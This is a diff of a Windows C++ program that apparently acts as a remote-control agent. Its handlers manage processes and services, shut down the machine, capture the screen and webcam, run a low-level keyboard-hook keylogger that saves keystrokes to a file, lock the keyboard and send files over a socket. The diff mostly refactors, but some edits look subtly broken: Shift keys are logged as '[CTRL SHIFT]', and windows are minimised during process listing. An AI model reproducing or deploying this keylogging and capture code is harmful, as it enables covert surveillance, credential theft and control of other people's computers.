@@ -3,9 +3,9 @@
 ofstream fo;
 stringstream inp, out;
 string requestFilePath;
-string webcamCapturePath = filesystem::current_path().string() + "/webcam.png";
-string screenCapturePath = filesystem::current_path().string() + "/screen.png";
-string keyloggerCapturePath = filesystem::current_path().string() + "/keylogger.txt";
+string webcamCapturePath = filesystem::current_path().string() + "\\webcam.png";
+string screenCapturePath = filesystem::current_path().string() + "\\screen.png";
+string keyloggerCapturePath = filesystem::current_path().string() + "\\keylogger.txt";
 VideoCapture* cap = nullptr;
 HHOOK hKeyloggerHook = nullptr;
 HHOOK hKeylockerHook = nullptr;
@@ -48,7 +48,7 @@ unordered_map<int, string> specialKeys = {
     {0xFF, "[Undefined]"}
 };
 
-map<string, map<string, function<void()>>> handlers = {
+unordered_map<string, unordered_map<string, function<void()>>> handlers = {
     {
         "list", 
         {
@@ -241,18 +241,7 @@ void getInstruction() {
 }
 
 string getFileName(const string& filePath) {
-    size_t pos1 = filePath.find_last_of('/'), pos2 = filePath.find_last_of('\\');
-    size_t pos;
-    if (pos1 == string::npos) {
-        pos = pos2;
-    }
-    else if (pos2 == string::npos) {
-        pos = pos1;
-    }
-    else {
-        pos = (pos1 > pos2) ? pos1 : pos2;
-    }
-    return filePath.substr(pos + 1);
+    return filePath.substr(filePath.find_last_of('\\') + 1);
 }
 
 void listDir(const string& dirPath) {
@@ -265,7 +254,7 @@ void listDir(const string& dirPath) {
     }
     
     do {
-        const wstring fileOrDir = findFileData.cFileName;
+        wstring fileOrDir = findFileData.cFileName;
         if (fileOrDir != L"." && fileOrDir != L"..") {
             out << string(fileOrDir.begin(), fileOrDir.end()) << endl;
         }
@@ -275,13 +264,12 @@ void listDir(const string& dirPath) {
     FindClose(hFind);
 }
 
-// Function to get the main window handle of a process
 HWND GetMainWindowHandle(DWORD processId) {
     HWND hwnd = GetTopWindow(0);
     while (hwnd) {
         DWORD windowProcessId;
         GetWindowThreadProcessId(hwnd, &windowProcessId);
-        if (windowProcessId == processId && IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0) {
+        if (windowProcessId == processId && IsWindowVisible(hwnd) && GetWindowTextLengthW(hwnd) > 0) {
             return hwnd;
         }
         hwnd = GetNextWindow(hwnd, GW_HWNDNEXT);
@@ -290,13 +278,12 @@ HWND GetMainWindowHandle(DWORD processId) {
 }
 
 void listApps() {
-    PROCESSENTRY32W entry;
-    entry.dwSize = sizeof(PROCESSENTRY32W);
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (!snapshot) {
         throw runtime_error("Failed to take a snapshot of processes");
     }
     
+    PROCESSENTRY32W entry = { sizeof(entry) };
     if (!Process32FirstW(snapshot, &entry)) {
         CloseHandle(snapshot);
         throw runtime_error("Failed to list processes");
@@ -310,6 +297,7 @@ void listApps() {
             wstring executeFileName(entry.szExeFile);
             out << setw(11) << right << entry.th32ProcessID << " | " 
                 << string(executeFileName.begin(), executeFileName.end()) << endl;
+            CloseWindow(hwnd);
         }
     } while (Process32NextW(snapshot, &entry));
     CloseHandle(snapshot);
@@ -322,9 +310,9 @@ void startApp(LPWSTR appPath) {
         throw runtime_error("Failed to start process");
     }
 
-    out << "Process started successfully.\n";
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
+    out << "Process started successfully.\n";
 }
 
 void stopApp(DWORD processID) {
@@ -418,15 +406,14 @@ void stopServiceByName(LPCWSTR serviceName) {
 }
 
 void enableShutdownPrivilege() {
-    HANDLE token;
-    TOKEN_PRIVILEGES tkp;
-
     // Open a handle to the process's access token
+    HANDLE token;
     if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token)) {
         throw runtime_error("Failed to open process token. Error: " + to_string(GetLastError()));
     }
 
     // Look up the LUID for the shutdown privilege
+    TOKEN_PRIVILEGES tkp;
     if (!LookupPrivilegeValueW(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid)) {
         CloseHandle(token);
         throw runtime_error("Failed to lookup privilege value. Error: " + to_string(GetLastError()));
@@ -436,7 +423,7 @@ void enableShutdownPrivilege() {
     tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
     // Adjust the token's privileges to enable shutdown privilege
-    if (!AdjustTokenPrivileges(token, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0)) {
+    if (!AdjustTokenPrivileges(token, FALSE, &tkp, 0, NULL, NULL)) {
         CloseHandle(token);
         throw runtime_error("Failed to adjust token privileges. Error: " + to_string(GetLastError()));
     }
@@ -470,8 +457,8 @@ void restartMachine() {
     out << "Restart initiated successfully. This machine will restart after " << SHUTDOWN_DELAY << " seconds.\n";
 }
 
-void copyFile(LPCWSTR src, LPCWSTR dest) {
-    if (!CopyFileW(src, dest, FALSE)) {
+void copyFile(LPCWSTR src, LPCWSTR dst) {
+    if (!CopyFileW(src, dst, FALSE)) {
         throw runtime_error("Failed to copy file");
     }
     
@@ -487,16 +474,14 @@ void deleteFile(LPCWSTR filePath) {
 }
 
 void captureScreen() {
-    // Get the desktop device context (DC)
-    HDC hScreenDC = GetDC(NULL);
-    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
-
     // Use device-independent pixels (DPI scaling) to get the actual screen resolution
     HDC hdc = GetDC(NULL);
     int screenWidth = GetDeviceCaps(hdc, DESKTOPHORZRES);  // Actual width in pixels
     int screenHeight = GetDeviceCaps(hdc, DESKTOPVERTRES); // Actual height in pixels
 
     // Create a compatible bitmap for the screen DC
+    HDC hScreenDC = GetDC(NULL);
+    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
     HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
     SelectObject(hMemoryDC, hBitmap);
 
@@ -532,7 +517,7 @@ void captureScreen() {
         throw runtime_error("Failed to save the screenshot");
     }
     
-    out << "Capture screen successfuly.\n\nSee more in file " << screenCapturePath.substr(screenCapturePath.find_last_of("/") + 1);
+    out << "Capture screen successfuly.\n\nSee more in file " << getFileName(screenCapturePath);
 }
 
 LRESULT CALLBACK KeyloggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -546,7 +531,7 @@ LRESULT CALLBACK KeyloggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
             // Handle Shift keys
             if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
                 isShiftDown = true;
-                // Do not log Shift key presses
+                fo << "[CTRL SHIFT] ";
             }
             // Handle Control keys
             else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
@@ -596,16 +581,7 @@ LRESULT CALLBACK KeyloggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
                 if (result > 0) {
                     char utf8Char[4] = { 0 };
-                    WideCharToMultiByte(
-                        CP_UTF8,
-                        0,
-                        unicodeChar,
-                        result,
-                        utf8Char,
-                        sizeof(utf8Char),
-                        NULL,
-                        NULL
-                    );
+                    WideCharToMultiByte(CP_UTF8, 0, unicodeChar, result, utf8Char, sizeof(utf8Char), NULL, NULL);
                     fo << utf8Char << " ";
                 }
                 else {
@@ -620,7 +596,7 @@ LRESULT CALLBACK KeyloggerProc(int nCode, WPARAM wParam, LPARAM lParam) {
             // Handle Shift keys
             if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
                 isShiftDown = false;
-                // Do not log Shift key releases
+                fo << "[CTRL SHIFT] ";
             }
             // Handle Control keys
             else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {
@@ -671,12 +647,10 @@ void startKeylogger() {
 
 void stopKeylogger() {
     if (hKeyloggerHook) {
-        // Post a message to wake up the message loop
         keepRunning = false;
-        PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0);
-        out << "Keylogger stopped successfully.\n\nSee more in file " << getFileName(keyloggerCapturePath);
-    
+        PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0); // Post a message to wake up the message loop
         fo.close();
+        out << "Keylogger stopped successfully.\n\nSee more in file " << getFileName(keyloggerCapturePath);
     }
     else {
         out << "Keylogger already stopped.\n";
@@ -686,8 +660,8 @@ void stopKeylogger() {
 void startCamera() {
     if (!cap) {
         cap = new VideoCapture(0);
-        cap->set(cv::CAP_PROP_FRAME_WIDTH, 1280);
-        cap->set(cv::CAP_PROP_FRAME_HEIGHT, 720);
+        cap->set(CAP_PROP_FRAME_WIDTH, 1280);
+        cap->set(CAP_PROP_FRAME_HEIGHT, 720);
     
         if (!cap || !cap->isOpened()) {
             throw runtime_error("Failed to open webcam");
@@ -746,10 +720,10 @@ void sendFile(CSocket& socket, const string& filePath) {
     CSocketFile socketFile(&socket);
     CArchive archive(&socketFile, CArchive::store);
 
-    vector<BYTE> buffer(BUFFER_SIZE);
+    char buffer[BUFFER_SIZE];
     UINT bytesRead;
-    while ((bytesRead = file.Read(buffer.data(), static_cast<UINT>(buffer.size())))) {
-        archive.Write(buffer.data(), bytesRead);
+    while ((bytesRead = file.Read(buffer, sizeof(buffer)))) {
+        archive.Write(buffer, bytesRead);
     }
     archive.Flush();
     file.Close();
@@ -764,11 +738,6 @@ LRESULT CALLBACK KeylockerProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 void lockKeyboard() {
     if (!hKeylockerHook) {
-        hKeylockerHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeylockerProc, nullptr, 0);
-        if (!hKeylockerHook) {
-            throw runtime_error("Failed to lock keyboard. Error: " + to_string(GetLastError()));
-        }
-
         keepRunning = true;
         thread keylockerThread([]() {
             hKeylockerHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeylockerProc, nullptr, 0);
@@ -797,9 +766,8 @@ void lockKeyboard() {
 
 void unlockKeyboard() {
     if (hKeylockerHook) {
-        // Post a message to wake up the message loop
         keepRunning = false;
-        PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0);
+        PostThreadMessageW(GetCurrentThreadId(), WM_QUIT, 0, 0); // Post a message to wake up the message loop
         out << "Keyboard unlocked successfully.\n";
     }
     else {
